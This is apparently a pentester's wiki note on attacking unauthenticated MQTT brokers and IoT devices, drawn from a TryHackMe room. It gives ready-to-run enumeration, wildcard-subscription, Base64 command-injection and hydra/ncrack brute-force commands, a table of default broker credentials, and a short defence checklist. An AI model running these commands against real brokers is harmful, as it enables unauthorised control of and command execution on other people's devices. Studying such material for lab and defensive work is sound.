---
title: "IoT & MQTT Attacks"
type: technique
tags: [enumeration, exploitation, iot, mqtt, network, thm]
phase: enumeration
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [thm-linux-iot]
---

# IoT & MQTT Attacks

## What it is

IoT devices often expose insecure communication protocols with no authentication, weak default credentials, or unencrypted channels. MQTT (Message Queuing Telemetry Transport) is a lightweight publish/subscribe messaging protocol widely used by IoT devices — smart lights, thermostats, speakers, industrial sensors — that frequently runs with no authentication and broadcasts sensitive device state on predictable topics.

## How it works

MQTT operates on a broker/client model. Devices publish messages to named topics; subscribers receive messages matching their topic filters. The broker (default port 1883 unencrypted, 8883 TLS) routes messages between all connected clients. If no authentication or authorisation is configured, any network-connected attacker can:
- Subscribe to all topics and passively read every device's state
- Publish crafted commands to control devices
- Intercept encoded payloads that contain credentials or command channels

---

## Methodology

### Step 1: Discover the MQTT broker

```bash
# Nmap — detect Mosquitto and enumerate topics via NSE script
nmap -sV -sC -p 1883 TARGET

# The mqtt-subscribe NSE script automatically subscribes to $SYS/# and dumps broker stats and topic samples
# Example output shows active topics like:
#   patio/lights: {"color":"ORANGE","status":"OFF"}
#   storage/thermostat: {"temperature":24.48}
```

### Step 2: Subscribe to all topics (wildcard)

The MQTT multi-level wildcard `#` matches all topics at any depth. Use it to passively receive every message flowing through the broker:

```bash
# Subscribe to all topics
mosquitto_sub -h TARGET -t "#"

# With verbose output (shows topic names alongside payloads)
mosquitto_sub -h TARGET -t "#" -v

# With authentication (if required)
mosquitto_sub -h TARGET -t "#" -u "username" -P "password"

# Subscribe to a specific topic hierarchy
mosquitto_sub -h TARGET -t "home/#"
mosquitto_sub -h TARGET -t "device/+/status"    # + = single-level wildcard
```

### Step 3: Decode payloads

MQTT payloads are often Base64-encoded JSON. Decode to read device command structures:

```bash
# Manual decode
echo "eyJpZCI6ImNkZDFiMWMwLT..." | base64 -d

# Example decoded payload revealing command structure:
# {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
#  "registered_commands":["HELP","CMD","SYS"],
#  "pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
#  "sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

The intercepted JSON reveals:
- The device's unique ID
- Supported commands (`CMD` = execute shell command)
- The specific pub/sub topics for that device's channel

### Step 4: Interact with a device channel

After discovering a device's dedicated pub/sub topics:

```bash
# Open a listener on the device's publish topic (responses come here)
mosquitto_sub -h TARGET -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"

# In another terminal: publish a message to the device's subscribe topic
mosquitto_pub -h TARGET -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "hello"
# Device responds with error explaining expected message format
```

### Step 5: Send a valid command (command injection)

Once the expected message format is known, craft a command payload:

```bash
# Build the JSON command payload
echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}' | base64
# eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==

# Publish the base64-encoded command
mosquitto_pub -h TARGET -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" \
  -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ=="

# Watch for response on the pub topic listener
```

**Reading the flag:**

```bash
# Encode the read command
echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat /flag.txt"}' | base64

# Publish and receive response on the pub topic
```

---

## CTF Example: Bugged (THM)

Mosquitto 2.0.14 running on port 1883 with no authentication. Multiple IoT devices publishing sensor data.

**Attack chain:**

1. Nmap with `mqtt-subscribe` script reveals active topics: `patio/lights`, `kitchen/toaster`, `storage/thermostat`, etc.

2. Subscribe to all topics with wildcard; one topic yields a Base64 payload:

```bash
mosquitto_sub -h 10.10.10.30 -t "#"
# Returns: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIs...
```

3. Decode to discover device ID and dedicated command channel topics.

4. Subscribe to the device's pub topic (for responses), then send a test message to its sub topic — response reveals expected Base64 JSON format.

5. Encode a `CMD` payload with `arg: "cat /home/user/flag.txt"` and publish to the sub topic; read the flag in the response on the pub topic listener.

---

## Default Credentials

MQTT brokers that do require authentication frequently use weak defaults:

| Broker | Default username | Default password |
|--------|-----------------|-----------------|
| Mosquitto (no auth) | — | — |
| HiveMQ | admin | hivemq |
| RabbitMQ | guest | guest |
| VerneMQ | (varies) | (varies) |
| EMQ X | admin | public |

---

## Additional Attack Vectors

### Broker enumeration via $SYS topics

The `$SYS/` hierarchy is a special reserved prefix that MQTT brokers use to publish self-diagnostics. It is often accessible without authentication:

```bash
mosquitto_sub -h TARGET -t '$SYS/#' -v
# Reveals: broker version, uptime, connected clients, bytes sent/received, retained message count
```

### Credential brute force (authenticated brokers)

```bash
# Hydra MQTT brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mqtt://TARGET

# Ncrack
ncrack -p 1883 --user admin -P /usr/share/wordlists/rockyou.txt TARGET
```

### Retained message inspection

MQTT brokers can store the last message on each topic (retained messages). These persist even when no device is publishing:

```bash
# Retained messages are delivered immediately on subscribe
mosquitto_sub -h TARGET -t "#" -v
# Any message with the RETAIN flag set will be delivered immediately
```

### TLS MQTT (port 8883)

```bash
# Connect with TLS (skip certificate verification in test environments)
mosquitto_sub -h TARGET -p 8883 -t "#" --insecure --cafile ca.crt
```

---

## Defence

- **Enable authentication** — configure Mosquitto with `password_file` and set `allow_anonymous false`
- **Authorisation (ACLs)** — use `acl_file` to restrict which clients can publish/subscribe to which topics
- **TLS encryption** — configure port 8883 with certificates; disable plain-text port 1883 externally
- **Network segmentation** — place IoT devices on a separate VLAN with no internet or internal network access
- **Firmware updates** — IoT devices are rarely updated; apply vendor patches for known broker vulnerabilities
- **Audit `$SYS/` access** — restrict the `$SYS/#` topic to monitoring clients only

## Tools

- `mosquitto_sub` — MQTT subscriber; `-t "#"` subscribes to all topics
- `mosquitto_pub` — MQTT publisher; used to send commands to devices
- MQTT Explorer — GUI browser for MQTT brokers; visualises topic trees and payloads
- [[wiki/tools/nmap]] — NSE script `mqtt-subscribe` enumerates broker and topics automatically
- CyberChef — Base64 decode and encode payloads in browser

## Sources

- THM: Bugged (`bugged`) — Mosquitto 2.0.14, unauthenticated broker, command injection via Base64 JSON payload
